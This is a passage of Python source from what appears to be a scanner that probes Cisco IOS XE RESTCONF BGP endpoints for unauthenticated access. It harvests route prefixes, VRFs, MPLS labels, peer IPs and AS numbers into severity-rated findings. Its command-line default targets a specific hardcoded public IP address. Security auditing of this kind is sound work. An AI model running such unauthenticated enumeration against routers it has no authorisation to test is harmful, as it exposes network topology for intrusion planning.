        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                return resp.status, resp.read(262144).decode('utf-8', errors='replace')
        except urllib.error.HTTPError as e:
            return e.code, ''
        except Exception:
            return None, ''

    # Per-VRF BGP RIB: prefix-indexed tree traversal exposing full route set
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-bgp-oper:bgp-state-data/bgp-route-vrfs/bgp-route-vrf'
    )
    if status == 200 and body:
        prefix_hits = re.findall(
            r'"(?:prefix|network|destination)"\s*:\s*"([0-9a-fA-F:./]{4,50})"', body
        )
        path_ids = re.findall(r'"(?:path-id|bestpath|local-pref)"\s*:\s*(\d+)', body)
        vrf_names = list(set(re.findall(r'"(?:vrf-name|vrf)"\s*:\s*"([^"]{1,64})"', body)))
        mpls_hits = re.findall(
            r'"(?:label|mpls-label|vpn-label|vrf-label)"\s*:\s*"?(\d+)"?', body
        )
        findings.append({
            'severity': 'CRITICAL',
            'title': 'IOS_XE_BGP_RIB_VRF_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-bgp-oper:bgp-state-data'
                f'/bgp-route-vrfs/bgp-route-vrf returned HTTP 200 unauthenticated; '
                f'full BGP RIB (prefix-indexed tree) exposed — {len(prefix_hits)} '
                f'prefix(es) across {len(vrf_names)} VRF(s); {len(mpls_hits)} MPLS '
                f'label(s) disclosed (MPLS VPN topology reconstruction); '
                f'sample_prefixes={prefix_hits[:4]}; vrfs={vrf_names[:6]}; '
                f'mpls_labels={mpls_hits[:4]}; {len(body)} bytes'
            ),
            'host': host,
            'port': port,
        })

    # BGP peer state tree: neighbor IPs, AS numbers, session state
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-bgp-oper:bgp-state-data/neighbors'
    )
    if status == 200 and body:
        peer_ips = re.findall(
            r'"(?:neighbor-id|peer-id|remote-addr|neighbor)"\s*:\s*"([0-9a-fA-F:./]{4,50})"',
            body
        )
        peer_as = re.findall(
            r'"(?:remote-as|peer-as|as-number)"\s*:\s*(\d+)', body
        )
        session_states = list(set(re.findall(
            r'"(?:session-state|bgp-state|state)"\s*:\s*"([^"]{1,40})"', body
        )))
        router_ids = re.findall(
            r'"(?:router-id|local-router-id)"\s*:\s*"([0-9.]{7,15})"', body
        )
        findings.append({
            'severity': 'HIGH',
            'title': 'IOS_XE_BGP_PEER_TREE_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-bgp-oper:bgp-state-data/neighbors '
                f'returned HTTP 200 unauthenticated; BGP peer state tree exposed — '
                f'{len(peer_ips)} peer IP(s), {len(peer_as)} AS number(s), '
                f'session_states={session_states[:4]}; '
                f'sample_peers={peer_ips[:4]}; sample_as={peer_as[:6]}; '
                f'router_ids={router_ids[:3]}; '
                f'full AS-path topology and iBGP mesh reconstructible; '
                f'{len(body)} bytes'
            ),
            'host': host,
            'port': port,
        })

    # AFI/SAFI combinations: VPN and L2VPN topology surface
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-bgp-oper:bgp-state-data/address-families'
    )
    if status == 200 and body:
        afi_hits = list(set(re.findall(
            r'"(?:afi|address-family|afi-safi)"\s*:\s*"([^"]{1,60})"', body
        )))
        safi_hits = list(set(re.findall(
            r'"(?:safi|sub-afi|subsequent-afi)"\s*:\s*"([^"]{1,60})"', body
        )))
        vpnv4_present = bool(re.search(r'vpnv4|vpn|l3vpn|mpls.vpn', body, re.IGNORECASE))
        l2vpn_present = bool(re.search(r'l2vpn|evpn|vpls', body, re.IGNORECASE))
        route_count = len(re.findall(r'"(?:prefix|network)"\s*:', body))
        findings.append({
            'severity': 'HIGH',
            'title': 'IOS_XE_BGP_AFI_SAFI_TOPOLOGY_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-bgp-oper:bgp-state-data/address-families '
                f'returned HTTP 200 unauthenticated; AFI/SAFI combination tree exposed — '
                f'afi={afi_hits[:4]} safi={safi_hits[:4]}; '
                f'vpnv4_present={vpnv4_present} l2vpn_evpn_present={l2vpn_present}; '
                f'{route_count} route object(s) across address families; '
                f'MPLS VPN and L2VPN segment topology reconstructible from AFI/SAFI tree; '
                f'{len(body)} bytes'
            ),
            'host': host,
            'port': port,
        })

    # BGP process summary: local AS, router-id, RIB table counts
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-bgp-oper:bgp-state-data'
    )
    if status == 200 and body:
        local_as = re.search(r'"(?:local-as|as-number|asn)"\s*:\s*(\d+)', body)
        bgp_id = re.search(r'"(?:bgp-id|router-id|bgp-router-id)"\s*:\s*"([0-9.]{7,15})"', body)
        table_ver = re.search(r'"(?:table-version|bgp-table-version)"\s*:\s*(\d+)', body)
        findings.append({
            'severity': 'MEDIUM',
            'title': 'IOS_XE_BGP_PROCESS_STATE_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-bgp-oper:bgp-state-data '
                f'returned HTTP 200 unauthenticated; BGP process state exposed — '
                f'local_as={local_as.group(1) if local_as else "present"} '
                f'router_id={repr(bgp_id.group(1)) if bgp_id else "present"} '
                f'table_version={table_ver.group(1) if table_ver else "present"}; '
                f'BGP table version leaks convergence timing and topology change rate; '
                f'{len(body)} bytes'
            ),
            'host': host,
            'port': port,
        })

    return findings


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
if __name__ == '__main__':
    import sys
    host = sys.argv[1] if len(sys.argv) > 1 else '207.254.14.1'
    enum = IOSEnumerator(host)
    print(json.dumps(enum.run(), indent=2, default=str))
